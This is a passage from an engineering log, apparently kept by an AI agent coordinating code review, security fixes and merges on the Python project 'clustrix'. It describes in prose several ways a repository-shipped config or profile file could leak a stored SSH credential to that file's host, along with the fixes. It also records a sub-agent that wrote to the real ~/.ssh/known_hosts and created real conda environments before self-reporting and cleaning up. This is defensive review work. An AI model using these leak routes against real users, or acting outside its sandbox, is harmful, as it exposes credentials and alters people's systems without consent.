        except Exception:      # <-- silent swallow
            continue
        set_config_source(_config, source)
```

**That is the defect #123 exists to remove**, on the exact lines that conflict.
#123's version raises `ConfigFileError` for a found-but-unloadable file and
warns (naming the file) when a candidate cannot be stat'd.

So resolving conflicts 4 and 5 by "taking the security branch's side" — the
instinctive choice, since #167 is the credential fix — would **reintroduce a
silent failure into the config loader**. Taking #123's side alone would drop
provenance and reopen the exfiltration path.

The merge must take **#123's control flow and error handling** and **#167's
provenance tagging**, which is what the design recorded earlier says. It is now
confirmed against the real conflict rather than inferred from hunk offsets.

### Conflict-by-conflict resolution

| # | Resolution |
|-|-|
| 1 | union the imports: `threading` + `warnings`, `List` + `get_args`/`get_origin` |
| 2 | keep **both** comment blocks — they document different things (why provenance exists; why the singleton is pure and the file read is not) |
| 3 | keep **both** statements — `set_config_source(..., EXPLICIT_FILE)` **and** `_default_config_loaded = True`. They are independent and both required. Write one merged comment |
| 4 | #123's `_default_config_candidates()` shape, returning `List[Tuple[Path, str]]` |
| 5 | #123's body — including the `OSError` guard around `Path.cwd()` that #167 lacks entirely — with #167's source tags attached, and #167's `config_dir_is_default()` → `REDIRECTED_CONFIG_DIR` logic preserved. Replace the `except Exception: continue` with #123's raising behaviour |

Note conflict 5 also carries #167's round-three L4 work (`config_dir_is_default()`
selecting `USER_CONFIG_DIR` vs `REDIRECTED_CONFIG_DIR`), which must survive.

**Deferred deliberately:** the #167 round-three review is still running. If it
produces a round-four fix, `config.py` changes again and this resolution has to
be redone. Do the real integration only after both branches are final.

## #167 round-three review — a new live leak, and four texts that lie

14 of 18 mutants killed and the taint-map design upheld, but the review found a
second live exfiltration path and a usability failure worse than either
behaviour alone.

### H1 — the profile store bypasses the taint map (LEAKED)

A repo ships `.envrc` setting `CLUSTRIX_CONFIG_DIR`, plus `profiles.yml` — and
**no `config.yml`**, so nothing taints and no warning fires. Then
`ProfileManager.load_from_file` does `ClusterConfig(**d)`, and `__post_init__`
stamps the host **`runtime`** — trusted. Verified against a real in-process SSH
server: `source=runtime trusted=True`, sentinel delivered. **RESULT: LEAKED.**

Root cause: `__post_init__` stamps `runtime` unconditionally, so a config
*parsed from a file* is indistinguishable from one a user constructed in Python.
Same defect class, arriving through a door the fix does not watch.

### H2 — the taint is permanent and every documented remedy is dead

After `./clustrix.yml` names host H: `configure(cluster_host=H)` → still
`working-directory`, refused. `load_config(<that file>)` → still refused.

**Four texts name exactly those two as the fix**: the working-directory warning,
the redirected-config-dir warning, `stored_credential_is_for_config`'s refusal
message, and `configuration.rst` / `quickstart.rst`. The only escapes that work
are `SSH_HOST=` in the credential file, or deleting the file.

Software disagreeing with its own error messages is worse than either behaviour
alone: it sends the user in a circle and teaches them the security control is
broken. Round four must either make `configure(cluster_host=)` genuinely clear
the taint — defensible, since typing it *is* the trust signal — or rewrite all
four texts.

### H3 — a non-string host evades

`normalize_hostname` returns `""` for non-strings and `set_config_source` skips
falsy keys, so `cluster_host: 0x7f000001` (PyYAML parses it as an **int**) is
never recorded, widget-Apply launders it to `runtime`, and the credential method
returned the sentinel with `success=True`. No wire leak today only because
paramiko dies in `getaddrinfo` — *the gate opened and the transport saved it*.

### The dangerous survivor

**M16 — "`load_config` clears the map" survives.** That is precisely the
friendly fix the four misleading texts would lead a maintainer to implement, and
it reopens round two's laundering with a green suite. The other three survivors
(M3, M10, M17) are untested invariants, including the realpath comparison the
commit message advertises — **zero coverage**.

### Upheld

No hostname *spelling* evades: record and lookup share one string and one
normaliser, so IDN/punycode/fullwidth/`:22`/IPv6/zoned/decimal-IP/U+212A/NBSP
all fail safe. realpath is not foolable. `_is_opaque_mapping` is exact across 19
annotation spellings with no over-widening. The map survives fork **and** spawn;
growth ~2.6 MiB per 20 000 loads, hostnames only, never persisted.

## #152 round-four review — the correction is proven; the warning gate is wrong

**A — proven, not sampled.** Over len 0-4999 × workers {1..64, 100, 1e3, 1e6},
and every `range(start, stop, step)` for start/stop ∈ [-20,20], step ∈ [-5,5],
**zero** gate-passing combinations yield one chunk. The gate formula equals
`len(range)` exactly (0 disagreements), so ≥3 iterations ⇒
`chunk_size ≤ len//2` ⇒ ≥2 chunks. Also unreachable via negative, stepped and
empty ranges, non-`range` iterables, and `cores` 0/-1/-2/None. Failed chunks
cannot shrink `results` — `_execute_parallel_chunks` pre-sizes and re-raises.

So the unwrap branch is dead code on the decorator path, and that is now an
argument rather than a sample.

**B — `_warning_reaches_someone()` disagrees with `logging` in 3 of 20 cases.**

| case | impl | `logging` |
|-|-|-|
| handler-level `Filter` drops the record | True | **False** |
| logger-level `Filter` drops the record | True | **False** |
| `NullHandler` subclass that emits | False | True (pessimistic — safe) |

`callHandlers` → `Handler.handle` applies filters; the reimplementation does
not. Budget spent, nothing delivered — **the original defect's exact shape.**

**Three survivors, one gap.** F1 (`level <= WARNING` → `<= ERROR`), F2 (drop the
`propagate` break) and F4 (`lastResort` → `return True`) all survive because
every test manipulates only the *logger* level and a `NullHandler`.

**F1 is the serious one**: a `clustrix` logger with an ERROR-only file handler
is an ordinary setup, and under it #152's original silence returns undetected.

**E — the documentation now contradicts itself inside this branch.**
`limitations.rst:304-307` says a run-time bound such as `range(n)` is declined.
False — `SafeRangeEvaluator._evaluate_node` resolves `ast.Name` from
`local_vars` (`loop_analysis.py:286-290`); verified `range(n)` with `n=8`,
cores=2 → `[1,5,9,13]`. Only `range(len(data))` is genuinely declined. And
round four's **own new example at line 355 is `for i in range(n)`** — two claims
added by this campaign, 45 lines apart, disagreeing.

Also: "two per worker" (line 336) is exact only when `2*workers` divides the
range (n=100/w=3 → 7 chunks), and line 349 nests inline markup inside bold,
which docutils renders as visible backticks.

**Shape values verified exact and machine-independent**: `partial_sum(8)` → `28`
plain, `[6,22]`/`[1,5,9,13]`/`[0..7]` at cores 1/2/4; `partial_sum(2)` → `1`.
Identical with `os.cpu_count()` faked to 1, 2, 12 and at the real 12.

### The environment failures were environment failures

With a venv carrying `_tkinter` **and** `sklearn`: **collected 1780 / 27
deselected / 1753 selected → 1736 passed, 17 skipped, 0 failed.** The previous
rounds' "3-4 failures" are gone. Confirms they were missing declared dev deps,
not defects — and that quoting collected+selected+passed+skipped together makes
that obvious where `passed` alone did not.

## Packaging audit — no drift, one inconsistency

Checked the classic dual-declaration hazard: `setup.py` and `pyproject.toml`
are **identical** across core dependencies and all five extras
(`all`, `dev`, `docs`, `test`, `widget`). No drift, so the `psutil` /
`traitlets` additions landed correctly in both.

**CI is covered**, verified rather than assumed:

| workflow | installs |
|-|-|
| `tests.yml` | `-e ".[dev,test,widget]"` |
| `fast_ci.yml` | `-e ".[dev]"` |
| `real-world-tests.yml` | `-e ".[test]"` |
| `fast_ci.yml` docker block | `pip install pytest numpy pandas` — hand-listed, but it only backs an **import smoke test** plus a tiny computation, never the suite. Fine as-is. |

So the newly-declared deps reach every job that runs the suite.

### `[all]` is not a superset of `[dev]`

```
in [dev] but NOT in [all]: numpy, pandas, psutil, pytest-timeout,
                           scikit-learn, traitlets, types-paramiko,
                           types-pyyaml, types-requests
in [all] but NOT in [dev]: jupyter, nbsphinx, sphinx,
                           sphinx-autodoc-typehints, sphinx-wagtail-theme
```

`[all]` already carries `black`, `flake8`, `mypy` and `pytest`, so it is plainly
meant to be dev + docs + widget — yet it omits nine of `[dev]`'s packages. A
user who installs `[all]` and runs the suite hits the **exact** missing-`psutil`
failure that was just fixed.

Not a CI problem and below the bar for its own issue. Fix it in the same sitting
as the merge: make `[all]` the union of the other extras rather than a
hand-maintained third list — a hand-maintained list is what let `psutil` and
`traitlets` go undeclared in the first place.

## #152 round five — `cf9a1e5`

F1/F2/F4 all die, each pinned behaviourally: 50 calls under the obstruction
(asserting the collecting stream stayed empty, with an `isEnabledFor` vacuity
guard), then handlers restored and exactly 1 message. Under mutation the
recovery phase yields 0.

**The filter fix is a good judgement call.** Rather than *running* a filter to
predict its verdict — which would execute it twice per delivered message and
corrupt any filter that counts or rate-limits — the gate **fails safe**: it
returns `False` if `logger.filters`, skips a handler carrying `handler.filters`,
and requires `not lastResort.filters`. Both drop cases now agree with
`logging`; filter-passes is pessimistic, i.e. repeats rather than silence.

**`sphinx -W` is blind to nested inline markup.** The `**bold ``code``**`
pattern renders literal backticks and the docs gate does **not** warn. Five
instances existed (349, 697, 700, 707, 713), not the one reported — found with
docutils, not by the gate. A one-off fix will silently regress; whether to add a
check is with the final review.

**The `range(n)` correction was verified in both directions**, which is what
separates fixing a false claim from replacing it with a differently-false one:
`range(n)` accepted, `range(n+1)` accepted, `m = n*2; range(m)` **declined**
(only bound args reach `local_vars`, `loop_analysis.py:637`), `n=8.0` declined,
`range(len(data))` declined.

### The flaky test is diagnosed — a timing budget, not a defect

The child needs ~0.42 s (interpreter start plus paramiko import) before its
first append; the kill window is `uniform(1.0, 2.0)`, leaving ~0.58 s of margin
on the worst draw. Under `-n 8` a 2.4× startup slowdown consumes it and the
test's own vacuity guard trips. **The writer is correct; the test's timing
assumption is not.** No production race.

### A poisoned venv

The scratchpad's older `venv` had its `python` symlink pointing at pyenv
3.10.12 rather than what it advertised. Round five built a clean `venv311`
(3.11.16) instead. Worth remembering: several of today's conclusions are
version-sensitive, so an interpreter that is not what it claims invalidates the
measurement silently. **Verify `python -V` and `sys.executable` before trusting
a venv.**

Gates: `collected 1786 / 27 deselected / 1759 selected -> 1742 passed, 17
skipped, 0 failed`; flake8, mypy, pinned black and `sphinx -W` all clean.

## The notebook re-run is proven — the last merge step is now mechanical

Trialled the `local_parallel_comparison.ipynb` re-run against `cf9a1e5` in a
scratch `git archive` tree, with `HOME` and `CLUSTRIX_CONFIG_DIR` pointed at a
scratch directory (the real `~/.clustrix` was **not** touched — verified).

```
nbclient 0.11.0, CPython 3.11.16, PYTHONPATH=<scratch tree>
-> executed OK
cell 7: ['stream:stderr', 'stream:stdout']
cell 9: ['stream:stderr', 'stream:stdout']
stderr> @cluster(cores=8) has no effect here: the local backend runs the
        decorated function once, in this process...
```

That is **exactly** the shape the checker said a fresh run produces, so the
re-run resolves the last two failures and takes
`check_docs_examples.py` to 234/234.

Recipe, for the merged tip:

```python
nb = nbformat.read(path, as_version=4)
nb.metadata["kernelspec"] = {"name": "python3", "display_name": "Python 3",
                             "language": "python"}
NotebookClient(nb, timeout=900, kernel_name="python3",
               resources={"metadata": {"path": <notebook dir>}}).execute()
nbformat.write(nb, path)
```

**Re-run at the merged tip, not before** — #123, #164 and #167 can each change
what the notebook prints, and the whole point is that the stored output matches
the code that ships.

## #167 round four — `b01771e`. Leak closed at the root.

**H1 fixed where it is true.** `__post_init__` no longer stamps `runtime`;
a `config_built_from_file(source)` context manager makes trust a property of
the **content** — a config built from bytes off a disk is never `runtime`,
whichever loader read it.

```
before: source=runtime  trusted=True   taint={}   -> LEAKED
after:  source=redirected-config-dir  trusted=False
        taint={'127.0.0.1': 'redirected-config-dir'}  -> no leak
```

That is the third time in this campaign the winning answer was **relocating a
rule** rather than patching its exceptions — after the hostname taint map and
the inverted swallow guard.

**H2 — the argument that settles it.** I had suggested letting
`configure(cluster_host=…)` clear the taint, since typing a hostname is a trust
signal. That is wrong, and the reason is exact: **the widget's Apply button *is*
`configure(cluster_host=<the file's host>, ...)` on a config it just read from
the file.** The two calls are indistinguishable, so clearing for the user who
types it also clears for the attacker's file — reopening round two's
laundering. The fix therefore belongs in the *texts*, and a **fifth** misleading
one was found in `limitations.rst`. All five now name only the two
measured-working remedies.

M3, M10, M16 and M17 all die. All four `__dict__` splats removed.
`1931 collected / 1904 selected / 1884 passed / 17 skipped / 3 failed`
(the 3 being the known `_tkinter` gap), +16 tests exactly.

### A third way a mutation run can lie — and this one is dangerous

Round four's first batch reported **four bogus KILLEDs from a zsh quoting bug
that ran zero tests.** It caught this itself and re-ran.

| failure mode | direction |
|-|-|
| stale `__pycache__` | false **SURVIVED** — wasted effort |
| SIGKILLed run | false **SURVIVED** — wasted effort |
| **command that runs no tests** | false **KILLED** — *false confidence* |

The first two are safe; the third is not. Standing rule added to every brief:
**assert a plausible collected-count and treat "0 collected" as a failed
measurement.**

## A gap in my own protocol: #123's fix round was never reviewed

Round one on #123 found seven defects, including two **new** concurrency bugs
the fix had introduced. The fix round (`5970455`) addressed all seven — and
nothing adversarial has looked at it since. Every other issue in this campaign
has had its fix rounds reviewed; this one slipped because its round-one review
was unusually thorough and I read "clean" into a report that never said it.

Dispatched now, aimed at the two concurrency fixes (600 clean interleavings
prove absence, not correctness) and at the inverted guard — the old rule was
defeated 13 ways, so "the handler must do something" deserves the same
treatment.

## CLAUDE.md audit — one false invariant, four stale numbers

CLAUDE.md is loaded into every session, so a wrong claim there propagates into
every piece of work. Audited its checkable assertions after the widget-dropdown
claim turned out to be false.

**Holds:**

| Claim | Check |
|-|-|
| no `ClusterType` enum | `grep "class ClusterType"` → empty |
| `SUPPORTED_CLUSTER_TYPES` is the single declaration | present at `config.py:265` |
| nothing on the execution path calls `FilePackager`/`package_function` | the prescribed grep → empty |
| no mock-awareness in shipped code | the prescribed grep → empty |
| no `cluster_put` / `cluster_get` | neither exists |
| `utils.py` is 3,109 lines | **exactly** 3,109 |

**Wrong or stale:**

| Claim | Actual |
|-|-|
| "the widget's dropdown reads that tuple, so they cannot drift apart" | **false** — true of `modern_notebook_widget.py:619`, false of `notebook_magic_widget.py:175-181`, which hardcodes the four values and never imports the tuple |
| `executor.py` is "a 39-line shim" | 33 lines |
| "20 of the 152 test modules" use mock | 21 of 166 |
| `_config = ClusterConfig()` at `config.py:431` | `:556` |
| `_load_default_config()` at `:596` | `:721` |

The false invariant is the one that matters and is already assigned to #165's
round five. The numbers are minor, but wrong line numbers in an
always-loaded instruction file cost every future session a lookup.

**Fix these after the merge, not before** — the lazy-loading change moves
`_config` and `_load_default_config` again, so correcting the line numbers now
guarantees correcting them twice.

Worth noting in CLAUDE.md's favour: it already says *"Recount with `grep -lE …`
before quoting a figure"* next to the mock count. It anticipated its own drift,
which is more than most instruction files do — and is the right pattern for any
number recorded in prose.

## `configuration.rst` — the merged section, designed

Read both branches' versions of "Where configuration comes from". The prose
carries **the same hazard as the code**: taking #167's side reintroduces a claim
that #123's fix makes false.

### The sentence that must NOT survive

#167's version says:

> A file that raises while loading is skipped silently and the search continues.

#123 changed exactly that: a found-but-unloadable file now raises
`ConfigFileError`, with the reasoning that being skipped in silence *"left the
process running on built-in defaults while you believed your file was in force;
a `cluster_host` that never took effect means the job runs somewhere other than
where you said."* Delete #167's sentence.

Likewise #167's heading **"At import."** must become #123's **"On first use."** —
it is the whole point of that branch.

### Resolution

Take **#123's body wholesale**: the "On first use" opening, the six-item list
(identical in both), the `<config dir>` sentence (identical), the paragraph
explaining why the search was deferred, the `WARNING`-and-continue rule for a
candidate that cannot be examined, and the `ConfigFileError` rule for one that
is found and fails to load.

Then append **#167's `.. warning::` block unchanged** — items 4-6 untrusted,
items 1-3 trusted only while `<config dir>` is `~/.clustrix`, provenance
following the hostname and permanent within the process, and the two remedies
that actually work.

The two fit together without editing because they answer different questions:
#123 says **when** the file is read and **what happens when it cannot be**;
#167 says **whether the result is trusted with a credential**. Only the one
overlapping sentence conflicts, and #123's version of it is the correct one.

One consistency check at merge time: #167's warning says
`configure(cluster_host=...)` and `load_config(path)` are **not** remedies —
that is round four's confirmed position, so it stays. Make sure #123's
paragraph, which mentions `load_config(path)` as a way to supersede the search,
does not read as contradicting it. It does not — superseding the *search* is a
different claim from clearing the *taint* — but the two sit close together and
should say so explicitly.

## Two more conflicts, and here #167 wins — decide per file, not per branch

#167's round four removed the `__dict__` splats, and #123 had already touched
the same two lines. Both branches fix **the same defect** differently:

| file | #167 | #123 |
|-|-|-|
| `scripts/collect_execution_evidence.py:227` | `configure(**asdict(ClusterConfig()))` | `get_config().__dict__.update(ClusterConfig().__dict__)` |
| `tests/unit/test_widget_profiles.py:32` | `configure(**asdict(ClusterConfig()))` | same shape, plus a long comment |

**#167's is strictly better, and #123's is actively unsafe against #167's own
work.** #123 removes the by-name `_config` import but **keeps** the `__dict__`
splat. #167 *adds private state* — `_clustrix_config_source`. So
`get_config().__dict__.update(ClusterConfig().__dict__)` would copy a freshly
constructed object's provenance attribute over the live one, resetting the
per-object source. The two changes are individually reasonable and jointly
wrong.

**Resolution: take #167's body in both files, keep #123's comment.** That
comment is worth preserving verbatim — it explains why binding the singleton by
name is the one thing that would make deferring the search unsafe, and that this
fixture was the only place in the tests still doing it.

### The general rule this settles

`config.py` and `configuration.rst` resolve **toward #123**; these two resolve
**toward #167**. Deciding per branch — "the security fix wins", "the newer
branch wins" — would have been wrong in one direction or the other every time.
Each conflict has to be judged on which side is correct *for that hunk*, and in
three of the four cases the losing branch also contains something worth keeping
(an error message, a comment, a rationale).

### Current conflict inventory, at tips `cf9a1e5` / `b01771e` / `5970455` / `908fec8` / `1422862`

```
work/fixes         -> clean
work/silent-failures -> config.py, configuration.rst,
                        collect_execution_evidence.py, test_widget_profiles.py
work/widget-apply  -> config.py (the typing-import union)
work/named-env     -> clean
```

All four are designed. None is a genuine disagreement about behaviour — every
one is two correct changes landing on the same lines.

## #164 round four — `e0b1d39`. Invariants beat seams, demonstrated.

**Round three shipped invalid bash.** Its `conda info --base` fix joined two
shell function definitions with a **space**:

```
... }  _clustrix_conda_works() { ...
```

so the SSH probe **died before looking anywhere, on every cluster**,
`conda_setup_prefix` was always `""`, and every `conda create` ran with conda
uninitialised. Three review rounds and a 16-mutant campaign missed it. The new
submission-invariant test found it immediately — because it *runs* a submission
instead of inspecting generated text.

`tests/unit/test_submission_invariants.py` drives real `submit_slurm_job` /
`submit_ssh_job` against the in-process SSH server (shipped `ConnectionManager`
+ `SchedulerManager`, real socket, SFTP and shell, fixture `conda.sh` and
`sbatch`) and pins the property rather than the seam: **whatever the script
contains, VENV2's interpreter is never VENV1's.** M13 → 6 failures, M3 → 11,
M7 → 1, and M7's slurm twin still passes, so it is precise rather than blunt.

Finding 2 resolved as an **in-script** version guard rather than an
at-submission check, and the reasoning is sound: on this path clustrix has not
located conda at all, the login node is often not the compute node's image, and
the job answers for free where it counts. Finding 4 makes the "refused at config
time" claim **true** — `validate_conda_env_name()` now runs from
`__post_init__`, `configure()` and `load_config()` — rather than rewording it.

Gates: 3.12.10 → 1980 collected / 1953 selected / **1933 passed / 20 skipped /
0 failed**; 3.11.16 → 1936 passed / 17 skipped. Sphinx clean. Mock-module count
unchanged at 21.

### The flaky test: diagnosed quantitatively, and the fix is stronger

First append lands ~0.45 s idle but up to **3.2 s** at 32× oversubscription
(152/160 samples over 1.0 s), so `random.uniform(1.0, 2.0)` killed the child
before it wrote. Fixed by waiting for the first append, then killing — which
makes the kill **always** interrupt a running write loop. Reproduced 3 of 6
failing before; 8 passed three times under identical load after, and faster.
No production race.

### Two incidents, self-reported — and verified by me against the real files

The agent let clustrix create two real `clustrix_venv*` environments in
`~/opt/anaconda3`, and a standalone probe wrote one line to the real
`~/.ssh/known_hosts`. It deleted both and added fixture guards.

**Verified independently:** `known_hosts` is 32 lines with **0** `127.0.0.1`
and **0** `localhost` entries; no `clustrix_venv*` exists under
`~/opt/anaconda3`, `~/miniconda3` or `~/anaconda3`. The cleanup was real.

Self-reporting this is the right behaviour and the guards are now carried into
every subsequent brief: scrub `PATH` and assert no real conda is reachable, and
set `HOME` explicitly in every standalone script — the autouse fixture covers
pytest only, which is how both incidents happened.

## #167 round-four review — a fourth route, and a latent fail-open

**L1 LIVE LEAK.** `ModernClustrixWidget._discover_config_files` globs
`Path.cwd()` for any `*.yml`/`*.yaml`/`*.json` containing a `profiles:` mapping
and offers it in the **Load dropdown**. `_on_load_config`
(`modern_notebook_widget.py:1656`) calls `profile_manager.load_from_file()` with
the default `source=CONFIG_SOURCE_EXPLICIT_FILE` — trusted, never tainted.
Measured end to end: a repo-shipped `./profiles.yml` delivered the sentinel to
the repo's host. Remedy is one line; `_restore` already does it.

**L2 — the ContextVar fails OPEN across a plain `Thread` and across `spawn`.**
It holds across nesting, exception unwind, a generator yielding mid-block,
`await`, `create_task`, `fork`, and `copy`/`deepcopy`/`pickle`/`replace`/
`ClusterConfig(**asdict())`. Latent — no shipped loader constructs across those
boundaries — but *latent* is exactly how the profile-store bypass looked.

### Four routes to one leak — the count is itself a finding

| # | route | closed by |
|-|-|-|
| 1 | `stored_host in target_host` — empty host matches everything | exact match after normalisation |
| 2 | a working-directory `clustrix.yml` naming `cluster_host` | trust follows the hostname, not the object |
| 3 | `ProfileManager.load_from_file` → `__post_init__` stamps `runtime` | trust follows the **content's origin** |
| 4 | the widget's Load dropdown globbing cwd | (round five) |

Each was found only by an adversarial round; each was closed by **relocating a
rule** rather than patching its exceptions. But a credential-release decision
reachable from this many code paths is a design smell worth stating on the
issue: the question "may this secret go to this host" is asked in several
places, and every new caller is a new chance to forget.

### H2 re-verified in code and stands

`modern_notebook_widget.py:1717` `configure(**applied)` and
`notebook_magic_widget.py:784` `configure(**config_data)` are both plain field
dicts — no marker, no `trust=`, and `configure` rejects unknown keys. The only
candidate distinguisher, `has_unsaved_changes`, is form-level, cleared after
load, and lives in a widget that is never instantiated; it would misclassify a
user who edits `default_cores` while `cluster_host` is still the file's. **No
clean distinction exists**, so permanent taint is right and the fix belonged in
the texts.

### The collected-count guard earned its keep immediately

It fired **twice on the reviewer's own commands**: macOS has no `timeout`
binary (7 probes ran nothing), and a mistyped test path printed
`ERROR: file or directory not found` *above* `collected 0 items`, which
`-q | tail -3` hides. Both would have been silent false confidence this morning.

12/12 mutants killed. Both positive controls still leak **as they must** —
`user-config-dir` and a profile store inside `~/.clustrix`.

## #152 final review — verdict: done. And I had the filter trade backwards.

**The premise was inverted.** I warned that any filter would suppress the
warning permanently. The opposite happens: `logger.warning` sits **outside** the
gate (`decorator.py:637-641`), which guards only `request.reported.add(key)`.
So a filter never silences — it **un-throttles**:

| configuration | delivered |
|-|-|
| control | 1 / 5 |
| benign filter on `clustrix.decorator` | **5 / 5** |
| benign filter on the handler | **5 / 5** |
| `dictConfig` declaring a handler filter | **4 / 4** |
| filter on the **root** logger | 1 / 5, filter never called |

That last row kills the case I was most worried about: a benign root-logger
filter cannot silence clustrix, because `callHandlers` ignores **ancestor
logger** filters. `caplog`'s `LogCaptureHandler` carries `filters=[]`, so the
project's own tests still see exactly one warning, and `captureWarnings(True)`
has no interaction.

**Verdict: the trade is right** — silence is undetectable, repetition is
self-correcting — with one real cost: *unbounded* repetition in a tight loop,
which is precisely what the throttle exists to stop. A repeat cap closes it.

**The one gap: M10 survived.** Moving `logger.warning` **inside** the gate
converts repetition into genuine silence and passes the full suite. In the
reviewer's words: *"the direction the commit message argues for at length has no
test standing over it."*

`limitations.rst` verified **true case by case** — `range(n)` positional and
keyword accepted, `range(n+1)` accepted, `range(len(data))`, `m=n*2; range(m)`,
`n=8.0`, a closure bound and a module global all declined, an unsupplied default
accepted via `apply_defaults()`. Chunk arithmetic checked: 100/3→7, 10/4→10,
64/3→7, 64/{2,4,8,16}→`2*cores`.

Gates: `1786 collected / 1759 selected / 1742 passed / 17 skipped / 0 failed`;
black, flake8, mypy and `sphinx -W` all clean.

### The nested-markup defect is repo-wide, and the docs gate cannot see it

`sphinx -W` builds **clean** while the shipped HTML contains **18** instances of
`<strong>…``…``…</strong>` across **10 pages**. Smartquotes even curls the
quotes inside them (`cluster_type=”local”`) — proof it is plain text.

| source | instances |
|-|-|
| `.rst` | 9 |
| `.ipynb` | 7 |
| Python docstrings (`config.py:424,456`) | 2 |

`limitations.html` is clean — that is the one fixed earlier, which is how the
class was noticed at all. Nothing in `check_quality.py`, `pre_push_check.py` or
CI checks RST; `rstcheck`, `doc8` and `sphinx-lint` all miss it.

**The right check greps the built HTML** (`<strong>[^<]*```), not the RST
doctree — a doctree walk misses a sixth of them, because two come from
docstrings and seven from notebooks. One check, three source types.

## #165 — DONE. Final review: 15/15 mutants killed, nothing broke it.

Five fix rounds, four reviews. The reviewer's list of what **failed** to break it
is the useful part: 13 malformed values through both widgets' real load paths;
a pair-menu `TypeError` hunted for a reachable caller and found none; all eight
removed backends plus four malformed strings driven through the legacy loader
with full before/after state assertions; removed-backend profiles planted on
disk for both widgets; a stale accumulated flavor selected under a different
profile and traced to disk and to the live config.

Gates: `1809 collected / 1782 selected / 1765 passed / 17 skipped / 0 failed`,
run twice with identical results. mypy 35 files.

### Two insights worth keeping

**`key_file`'s real reason is mechanical, not conventional.** The comment argues
from `~/.ssh/config` binding `IdentityFile` inside a `Host` stanza. The
load-bearing reason is that `executor_connections.py:127` tries `key_file`
**first** and only falls back to a password when it is falsy — so a carried-over
key **actively suppresses authentication** for the new target. Convention is the
weaker half.

**The stated rule over-includes when read literally.** *"Does the value stop
being correct when the target changes?"* would sweep in `module_loads` —
`["cuda/11.8"]` plainly stops being correct on HF Jobs — yet excluding it is
right: it is inert there (only reaching `utils.py:2106` for scheduler/SSH
scripts) and clearing it would destroy the user's work for merely glancing at
another backend.

The operative test is narrower: **does a leftover value change behaviour on the
new target, or grant credentials or spending there?** A one-line rule is a
summary, not a decision procedure — and `hf_allow_gpu_flavors` shows the seam,
being a *permission*, which does not become incorrect but becomes ungranted.

**M15 is a nice result:** changing the Protocol's `value: object` to `str` is
killed **by mypy**, not by a test. The `object` choice is load-bearing rather
than decorative — a hand-edited YAML holds anything and the widget must still
open.

### The self-verifying grep is weaker than it looks

`grep -rn 'list(SUPPORTED_CLUSTER_TYPES)' clustrix/` shows three, and all three
genuinely import the tuple. But it counts a **literal across the package** —
nothing ties a hit to a cluster-type dropdown, and one of the three is the CLI.
A fourth widget spelling the list out, or hardcoding line 619 while putting the
literal anywhere else in that file, keeps the count at three.

The real invariant is `test_both_menus_are_the_supported_tuple_itself`, which
compares each menu **to the tuple**. The grep is the companion, not the guard —
worth saying so in CLAUDE.md rather than leaving a count to look like a proof.

## Filed: #171

`_on_config_name_change` has no collision check, so renaming a profile onto an
existing name **silently destroys** that profile. Reproduced with two stock
profiles. Worse than an ordinary overwrite: `save_to_file` omits secret-bearing
fields, so a profile's `password` and `hf_token` live **only in the session** —
there is no recovery path, and the action that destroys them is a *rename*.
Pre-existing; untouched by all five #165 commits.

## #167 round five — `fa289a4`. Fourth route closed.

**L1** closed with **two hunks** in `modern_notebook_widget.py` — line 29
(import) and 1655-1656 (`load_from_file(filename,
source=config_source_for_discovered_path(filename))` plus a comment). The
classifier already lived in `config.py` and stayed there. That restraint is
deliberate: `work/widget-apply` also edits this file, and a sprawling fix would
have turned the merge into a second design problem.

```
before: source=explicit-file        trusted=True   LEAKS
after:  source=redirected-config-dir trusted=False  no-leak
```

**L2 — the thread boundary now fails closed.** `config_built_from_file` also
records untrusted reads in a **process-wide table**, consulted *only when the
calling context declares nothing* — so the ContextVar keeps full precision where
it has an answer, and an escaped construction still comes out untrusted.

**`spawn` cannot be followed by any in-interpreter mechanism**, so rather than
pretend otherwise the fix adds an **AST-based guard**: it fails if a module
referencing `config_built_from_file` ever also references `multiprocessing` /
`ProcessPoolExecutor` / `billiard` / `loky` / `joblib`. AST rather than text, so
the docstring *naming* those modules is not a self-finding — a nice detail.

Gates: `1939 collected / 1912 selected / 1892 passed / 17 skipped / 3 failed`
(the known `_tkinter` three). 8 new tests, no mocks. Pre-commit hooks ran.

### What round five's review must answer

Two process-global structures now exist — the host taint map and this table —
and two globals can disagree. But the sharper question is the opposite of a
leak: **can the table falsely refuse a legitimate config?** It is consulted
whenever the context declares nothing, so an unrelated earlier file read could
in principle catch a config the user really did build in Python. A false refusal
that blocks the documented workflow is as fatal as a leak, because it is the
thing that gets the security fix reverted.

Also worth challenging: guarding by **module co-reference** is a heuristic for
"construction might escape". It is a reasonable proxy, not a proof, and it can
false-positive on a module that merely imports both for unrelated reasons.

## The two-hunk restraint paid off — measured

`work/fixes` (#167) and `work/widget-apply` (#165) both edit
`clustrix/modern_notebook_widget.py`. They **do not conflict**:

```
fixes        2 hunks  : line 29, lines 1655-1656
widget-apply 12 hunks : lines 32, 38, 1714-1749, 2116+, 2202, 2308, 2341, 2349
```

Different regions. The only conflict between those two branches is
`clustrix/config.py` — the typing-import union already designed.

Worth recording as a general point: telling the #167 agent to keep the widget
edit **minimal and to describe anything larger rather than make it** is what
kept a security fix and a UI fix out of each other's way across five rounds of
concurrent work on the same file. The instruction cost one sentence in a brief;
the alternative was a hand-merge of a security-critical change.

## #152 closing round — `aa1345f`. M10 dead, cap added, markup closed repo-wide.

**M10 dies**, and *why* it survived is the sharp part: **every previous filter
test used a *dropping* filter, where both arrangements look identical.** A
**passing** filter is the only shape that separates "warning outside the gate"
from "warning inside it". Four tests now fail on the mutation, including
`test_the_cap_does_not_outlive_the_configuration_that_caused_it` — *"the very
first call must reach the caller whatever the cap says; got 0"*.

That is a general lesson about test design: a test can exercise the right code
path and still be blind, because the *input shape* it happens to use makes both
the correct and incorrect implementations agree.

**Repeat cap implemented** — `UNCONFIRMED_REPEAT_LIMIT = 3`, `reported` becomes
`Dict[tuple,int]`. Safe because it is checked *after* the first delivery and
does **not** guard the `_warning_reaches_someone()` branch, so a listener that
arrives later is still told once. RED proof: with the cap branch removed, 20
calls → 20 warnings.

**Markup: the real count was 20, not 18** — a line-based grep misses spans that
wrap across source lines. 9 `.rst` / 9 `.ipynb` / 2 docstring. 16 fixed by the
agent; **4 were in the two notebooks I own** and it correctly left them alone
rather than touching another owner's files.

I fixed those four:

```
**Generate and upload `job.sh`**                    -> **Generate and upload** `job.sh`
**Clustrix does not support SLURM's `--array` …**   -> **…SLURM's** `--array` **directive.**
**Choose HuggingFace Jobs (`cluster_type=…`) when:**-> **Choose HuggingFace Jobs** (…) **when:**
```

Then verified the whole thing properly rather than by grep — my own regex threw
three false positives, because it matches the *closing* `**` of one span, the
code, and the *opening* `**` of the next, which is the corrected form:

```
